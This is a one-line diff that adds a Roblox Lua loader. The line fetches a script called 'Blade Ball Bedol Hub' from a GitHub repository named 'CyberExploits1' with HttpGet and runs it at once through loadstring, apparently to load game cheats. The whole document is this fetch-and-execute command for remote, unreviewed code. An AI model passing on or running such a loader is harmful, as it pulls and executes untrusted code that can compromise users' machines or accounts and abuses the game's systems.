@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CyberExploits1/Scripts/main/Blade%20Ball%20Bedol%20Hub.lua",true))()
